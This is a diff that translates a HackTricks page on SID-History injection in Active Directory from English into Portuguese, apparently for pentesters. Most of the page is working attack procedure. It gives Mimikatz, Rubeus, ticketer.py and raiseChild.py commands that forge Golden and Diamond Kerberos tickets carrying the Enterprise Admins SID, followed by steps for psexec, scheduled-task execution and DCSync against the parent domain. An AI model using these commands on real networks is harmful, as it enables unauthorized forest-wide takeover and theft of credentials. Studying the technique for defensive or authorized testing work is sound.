@@ -1,34 +1,32 @@
-# SID-History Injection
+## Injeção de SID History
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## Attack
+## Ataque
 
-SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the **user's previous SID would be added to the SID History** of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will **grant access to all resources in the parent**.
+O SID History foi projetado para suportar cenários de migração, onde um usuário seria movido de um domínio para outro. Para preservar o acesso aos recursos no "antigo" domínio, o **SID anterior do usuário seria adicionado ao SID History** de sua nova conta. Portanto, ao criar tal ticket, o SID de um grupo privilegiado (EAs, DAs, etc.) no domínio pai pode ser adicionado, o que **concederá acesso a todos os recursos no domínio pai**.
 
-This can be achieved using either a [**Golden**](sid-history-injection.md#golden-ticket) or [**Diamond Ticket**](sid-history-injection.md#diamond-ticket).
+Isso pode ser alcançado usando um [**Golden Ticket**](sid-history-injection.md#golden-ticket) ou [**Diamond Ticket**](sid-history-injection.md#diamond-ticket).
 
-For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in `S-1-5-21-<root domain>-519`. For example, from root domain SID `S-1-5-21-280534878-1496970234-700767426` the **"Enterprise Admins"** group SID is `S-1-5-21-280534878-1496970234-700767426-519`
+Para encontrar o **SID** do grupo **"Enterprise Admins"**, você pode encontrar o **SID** do **domínio raiz** e defini-lo em `S-1-5-21-<root domain>-519`. Por exemplo, a partir do SID do domínio raiz `S-1-5-21-280534878-1496970234-700767426`, o SID do grupo **"Enterprise Admins"** é `S-1-5-21-280534878-1496970234-700767426-519`.
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+Você também pode usar os grupos **Domain Admins**, que terminam em **512**.
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
-
+Outra maneira de encontrar o SID de um grupo do outro domínio (por exemplo, "Domain Admins") é com:
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
+### Golden Ticket (Mimikatz) com KRBTGT-AES256
 
 {% code overflow="wrap" %}
 ```bash
@@ -47,15 +45,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-{% endcode %}
-
-For more info about golden tickets check:
-
-{% content-ref url="golden-ticket.md" %}
-[golden-ticket.md](golden-ticket.md)
-{% endcontent-ref %}
-
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
+### Bilhete Diamond (Rubeus + KRBTGT-AES256)
 
 {% code overflow="wrap" %}
 ```powershell
@@ -69,7 +59,7 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 ```
 {% endcode %}
 
-For more info about diamond tickets check:
+Para mais informações sobre diamond tickets, consulte:
 
 {% content-ref url="diamond-ticket.md" %}
 [diamond-ticket.md](diamond-ticket.md)
@@ -83,7 +73,7 @@ ls \\mcorp-dc.moneycorp.local\c$
 ```
 {% endcode %}
 
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
+Elevar para DA ou root ou Enterprise admin usando o hash KRBTGT do domínio comprometido:
 
 {% code overflow="wrap" %}
 ```bash
@@ -99,15 +89,15 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 {% endcode %}
 
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+Com as permissões adquiridas a partir do ataque, você pode executar, por exemplo, um ataque DCSync no novo domínio:
 
 {% content-ref url="dcsync.md" %}
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-### From linux
+### A partir do Linux
 
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
+#### Manual com [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 
 {% code overflow="wrap" %}
 ```bash
@@ -131,27 +121,25 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 {% endcode %}
 
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automático usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+Este é um script Impacket que **automatiza a escalada do domínio filho para o domínio pai**. O script precisa de:
 
-* Target domain controller
-* Creds for an admin user in the child domain
+* Controlador de domínio de destino
+* Credenciais para um usuário administrador no domínio filho
 
-The flow is:
+O fluxo é:
 
-* Obtains the SID for the Enterprise Admins group of the parent domain
-* Retrieves the hash for the KRBTGT account in the child domain
-* Creates a Golden Ticket
-* Logs into the parent domain
-* Retrieves credentials for the Administrator account in the parent domain
-* If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
-
+* Obtém o SID do grupo Enterprise Admins do domínio pai
+* Recupera o hash para a conta KRBTGT no domínio filho
+* Cria um Golden Ticket
+* Faz login no domínio pai
+* Recupera as credenciais para a conta Administrador no domínio pai
+* Se a opção `target-exec` for especificada, ele se autentica no Controlador de Domínio do domínio pai via Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-
-## References
+## Referências
 
 * [https://studylib.net/doc/25696115/crto](https://studylib.net/doc/25696115/crto)
 
@@ -159,10 +147,10 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
